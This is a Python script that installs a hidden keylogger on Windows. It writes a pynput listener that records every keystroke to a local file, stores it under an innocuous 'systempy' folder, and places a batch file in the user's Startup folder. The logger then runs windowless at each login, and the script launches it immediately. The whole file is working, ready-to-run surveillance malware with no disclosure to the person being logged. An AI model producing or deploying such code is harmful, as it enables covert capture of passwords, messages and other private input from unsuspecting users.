import os
import subprocess
import shutil
import sys

pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
python_file_name = "key.pyw"  # Python file name, can be changed dynamically
batch_file_name = "start.bat"  # Custom batch file name, can be changed dynamically

startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
systempy_folder = "C:\\systempy"
python_script_dest = os.path.join(systempy_folder, python_file_name)
batch_file_path = os.path.join(startup_folder, batch_file_name)

if not os.path.exists(systempy_folder):
    os.makedirs(systempy_folder)

python_code = '''from pynput.keyboard import Key, Listener
import os
from datetime import datetime
import time

# Define paths
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

# Log start time
with open(log_file, "a") as file:
    file.write(f"\\n--- Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\\n")

# Debounce settings
recent_keys = {}
debounce_time = 0.2  # seconds

# Function to write keystrokes to file with debounce
def write_to_file(key):
    current_time = time.time()
    key_str = None

    # Handle key events
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = " "
    elif key == Key.enter:
        key_str = "\\n"
    elif key == Key.backspace:
        key_str = "[BS]"

    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time

# Start listener
with Listener(on_press=write_to_file) as listener:
    listener.join()
'''

# Write the Python code to the key.pyw file in the systempy folder
with open(python_script_dest, "w") as file:
    file.write(python_code)

# Define the contents of the custom batch file with dynamically detected pythonw path
batch_file_content = f"""@echo off
pushd %~dp0
"{pythonw_path}" "{python_script_dest}"
exit /b
"""

# Write the batch file in the Startup folder
with open(batch_file_path, "w") as file:
    file.write(batch_file_content)

# Execute the batch file (optional, to test it immediately)
subprocess.run(batch_file_path, shell=True)

print(f"Batch file created at: {batch_file_path} and Python script saved to: {python_script_dest}")
